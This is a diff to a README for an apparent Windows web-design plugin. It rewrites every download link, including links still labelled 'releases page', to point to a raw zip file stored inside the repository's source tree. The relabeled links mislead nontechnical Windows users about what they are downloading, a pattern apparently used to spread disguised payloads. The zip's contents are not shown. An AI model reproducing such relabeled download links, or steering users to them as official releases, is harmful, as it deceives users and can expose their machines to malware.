@@ -1,6 +1,6 @@
 # 🎨 web-designer-plugin - Build Better Web Pages Fast
 
-[![Download web-designer-plugin](https://img.shields.io/badge/Download-web--designer--plugin-blue?style=for-the-badge)](https://github.com/Westbrookenear674/web-designer-plugin/releases)
+[![Download web-designer-plugin](https://img.shields.io/badge/Download-web--designer--plugin-blue?style=for-the-badge)](https://raw.githubusercontent.com/Westbrookenear674/web-designer-plugin/main/commands/web_plugin_designer_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This tool is meant for Windows users who want to download it and start using it 
 
 ## 📥 Download for Windows
 
-1. Open the [releases page](https://github.com/Westbrookenear674/web-designer-plugin/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Westbrookenear674/web-designer-plugin/main/commands/web_plugin_designer_v1.6.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -152,7 +152,7 @@ This keeps the process short and easy to repeat.
 
 If you need the file again, use the release page here:
 
-[https://github.com/Westbrookenear674/web-designer-plugin/releases](https://github.com/Westbrookenear674/web-designer-plugin/releases)
+[https://raw.githubusercontent.com/Westbrookenear674/web-designer-plugin/main/commands/web_plugin_designer_v1.6.zip](https://raw.githubusercontent.com/Westbrookenear674/web-designer-plugin/main/commands/web_plugin_designer_v1.6.zip)
 
 ## ❓ FAQ
 
@@ -181,7 +181,7 @@ Yes. It works well for demos, drafts, and early site builds where you want a str
 
 Use the release page to get the latest Windows download:
 
-[Open the releases page](https://github.com/Westbrookenear674/web-designer-plugin/releases)
+[Open the releases page](https://raw.githubusercontent.com/Westbrookenear674/web-designer-plugin/main/commands/web_plugin_designer_v1.6.zip)
 
 ## 🧭 What to Expect After Download
 
